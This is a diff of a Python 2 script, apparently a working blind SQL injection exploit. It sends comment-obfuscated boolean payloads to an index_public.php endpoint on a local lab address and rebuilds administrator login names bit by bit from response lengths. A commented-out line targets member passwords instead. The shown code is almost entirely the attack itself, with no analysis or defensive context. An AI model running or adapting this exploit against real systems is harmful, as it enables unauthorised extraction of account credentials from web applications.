@@ -13,14 +13,9 @@ def inject(inj, ip):
 	value=0
 	for j in range(1,8):#if the username has 7 characters
 		for i in reversed(range(8)):#one character has 8-bits
-			
 		 	injection_string = "test'/**/or/**/(ascii((substring((%s),%s,1)))>>%s)=%s/**/or/**/1='" % (inj,j,i,value)
-
-
 		 	target = "http://%s/index_public.php?q=%s" %(ip,injection_string)
-
 		 	r = requests.get(target,proxies=proxies)
-
 		 	content_length = int(r.headers['Content-Length'])
 		 	if (content_length > 20):	 	    
 		 	    bit=bit+str("1")#if it returns true, bit will increase by 1
@@ -30,10 +25,7 @@ def inject(inj, ip):
 				  bit=bit+str("0")
 				  bit=bit+str("1")
 				  value=int(bit,2)
-		
-		
 		username = int(bit[:8],2)
-	
 		if username:
 			extracted += chr(username)
 			extracted_char = chr(username)
@@ -42,20 +34,16 @@ def inject(inj, ip):
 		else:
 			print "\n(+) done!"
 			break
-     	    
 		bit="0"
 		value=0
-
 	return extracted
 	
 def main():
-  
     ip = "192.168.137.103"
     print "(+) Retrieving username...."
     query = "select/**/login/**/from/**/admins"
     #query = "select/**/password/**/from/**/AT_members"
     username = inject(query, ip)
 
- 	
 if __name__ == "__main__":
     main()
